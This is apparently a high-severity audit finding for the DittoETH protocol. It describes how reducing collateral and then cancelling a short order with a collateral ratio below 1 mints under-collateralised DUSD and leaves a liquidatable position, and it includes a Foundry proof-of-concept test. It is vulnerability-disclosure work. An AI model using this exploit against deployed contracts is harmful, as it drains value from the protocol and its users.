## [H] An attacker can mint free DUSD and liquidate the corresponding Short Record to earn liquidation rewards

### Summary

An attacker can use `decreaseCollateral()` function to reduce the collateral of a Short Recordn (SR) and `cancelOrder()` to cancel the corresponding Short Order having a collateral ratio < 1. The Short Record ends up having less collateral than debt and is now liquidatable.

### Description

A user can create a Short Order with a collateral ratio (CR) of less than 1. The protocol ensures that at least `minShortErc` in the Short Orders Short Record has enough collateral by filling the Short Record with collateral to cover `minShortErc` before the Short Order is matched or placed on the order book.

In addition, during the match the bid also provides equivalent collateral to the `ercDebt` it creates. So if the Short Order CR is 0.7 it ends up being 1.7 CR after matching.

By utilising the `cancelShort()` and `decreaseCollateral()` functions on a short Order with CR < 1, an attacker can create free DUSD and make the Short Record liquidatable.

The [cancelShort()](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol#L923-L995) function lets the caller cancel a Short Order. If the `ercDebt` is smaller than `minShortErc` as shown in line 953 below, it mints the difference to the shorter (i.e the address that created the Short Order) in line 982. The amount of collateral needed is calculated in line 960 and uses `cr`. `cr` is the collateral ratio and if it is less than 1 then the protocol would be minting DUSD with lesser collateral. But since it has already ensured that `minShortErc` has enough collateral in the Short Record before the Short Order was created, this shouldn't be a problem.

```

The [decreaseCollateral()](ShortRecordFacet.sol#L83-L107) function lets the caller reduce the collateral he has in the Short Record.

An attacker can use `decreaseCollateral()` to reduce the collateral of the Short Record before cancelling. Thus, removing the collateral added for `minShortErc` and the protocol ends up minting DUSD with less Ethereum collateral.

The attacker earns the DUSD minted while providing less collateral value. The Short Record will become liquidatable and the attacker can further liquidate it to earn liquidation rewards.

### Impact

The protocol mints DUSD for free and pays liquidation rewards when the bad debt position is liquidated.

### Proof of Concept

To execute the POC the Short Record has to have debt so that `decreaseCollateral()` and `cancelShort()` can be called on it successfully. To do this, the POC creates two Short Orders, a normal Short Order and the other with CR < 1. It then uses a bid order to fill the normal Short Order and a tiny amount of the order with CR < 1.

The test can be run in the `Shorts.t.sol` file.

```solidity
    // Add the import below
    // import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";

    function test_StealDUSD() public {
        // set default Collateral Ratios
        vm.startPrank(owner);
        diamond.setInitialCR(asset, 170);
        diamond.setLiquidationCR(asset, 150);
        vm.stopPrank();

        initialCR = 170;
        uint80 price = DEFAULT_PRICE;
        uint88 amount = DEFAULT_AMOUNT;
        uint88 minShortErc = 2000 ether;

        // add a normal short order to fill the bid
        fundLimitShortOpt(price, amount, sender);
        // sender has 0 ethEscrowed
        assertEq(diamond.getVaultUserStruct(vault, sender).ethEscrowed, 0);
        depositEth(sender, price.mulU88(minShortErc).mulU88(1.7e18));
        uint initialEth = diamond.getVaultUserStruct(vault, sender).ethEscrowed;
        
        // creates a Short Order with CR = 0.7
        uint16[] memory shortHintArray = setShortHintArray();
        MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
        vm.prank(sender);
        diamond.createLimitShort(asset, price, minShortErc, orderHintArray, shortHintArray, 70);        

        // creates a Bid which completely fills the first Short Order and only fills 
        // 100000 wei in the second WEI
        fundLimitBidOpt(price, amount +  100000, receiver);

        assertEq(diamond.getAssetUserStruct(asset, sender).ercEscrowed, 0);
        vm.startPrank(sender);
        // decreases collateral by 499999999999999958, the collateral added to cover minShortErc is
        // 500000000000000000, but we can't remove everything because the protocol requires us to cover
        // the tiny debt we created
        decreaseCollateral(3, 499999999999999958); 
        cancelShort(101);
        
        uint finalEth = diamond.getVaultUserStruct(vault, sender).ethEscrowed;
        uint ercEscrowed = diamond.getAssetUserStruct(asset, sender).ercEscrowed;
        // profit ~= 0.15 ether ( price.mulU88(ercEscrowed) - initialEth-finalEth )
        assertGt(price.mulU88(ercEscrowed), initialEth-finalEth); 
        // the attacker can also decide to liquidate the position and earn more rewards
        assertLt(diamond.getCollateralRatio(asset, getShortRecord(sender, 3)), 150e18);
    }
